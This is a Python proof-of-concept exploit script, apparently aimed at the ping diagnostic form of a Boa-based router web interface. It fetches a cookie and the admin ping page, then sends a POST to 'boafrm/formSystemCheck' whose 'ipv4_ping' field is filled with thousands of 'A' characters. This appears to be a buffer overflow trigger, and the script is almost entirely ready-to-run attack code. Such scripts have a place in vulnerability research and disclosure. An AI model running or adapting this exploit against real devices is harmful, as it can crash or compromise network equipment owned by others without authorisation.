import argparse, requests
import sys
import re
import json
import time


class TestCase:
    def __init__(self, bug_url='', bug_http_body='', other_infos=[]):
        self.bug_url = bug_url
        self.bug_http_body = bug_http_body
        self.other_infos = other_infos


global cookie
global headers
global test_case
global request_id

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)


def load_test_case(test_case_no):
    bug_file = './bug-all.txt'
    with open(bug_file, 'r') as file:
        line = file.readline()
        while line:
            if line[4:-1] == test_case_no:
                print(line[:-1])
                break
            line = file.readline()

        global test_case
        test_case = TestCase
        for i in range(0, 9):
            line = file.readline()
            if line[:6] == 'BugUrl':
                test_case.bug_url = line[8:-1]
            if line[:len('BugHttpBody')] == 'BugHttpBody':
                test_case.bug_http_body = line[len('BugHttpBody') + 2:-1]
            if line[:len('OtherInfos')] == 'OtherInfos':
                test_case.other_infos = json.loads(line[len('OtherInfos') + 2:-1])
                break
        print(test_case.bug_url)
        print(test_case.bug_http_body)
        print(test_case.other_infos)

def get_XSRF_TOKEN():
    print("0. request", base_url)
    response = requests.get(url=base_url, headers={})
    global cookie
    cookie = response.headers.get('Set-Cookie')


def get_htm():
    htm_url = "admin_ping.htm"
    url = base_url + "/" + htm_url
    print("1. send request to", url)
    try:
        response = requests.get(url=url)
        print(response)
    except Exception as e:
        print(str(e))


def poc():
    target_url = "boafrm/formSystemCheck"
    print("2. get target_url:", target_url)
    url = base_url + "/" + target_url
    print("3. send request to", url)
    data = "ping_type=v4&ipv4_ping=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    print("request body:", data)
    response = requests.post(url=url, headers={}, data=data, allow_redirects=False)
    print(response)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run the exploit')
    parser.add_argument('ip', type=str, default=None, help='The server ip')
    args = parser.parse_args()

    global base_url
    base_url = "http://{}".format(args.ip)

    get_XSRF_TOKEN()
    get_htm()
    poc()

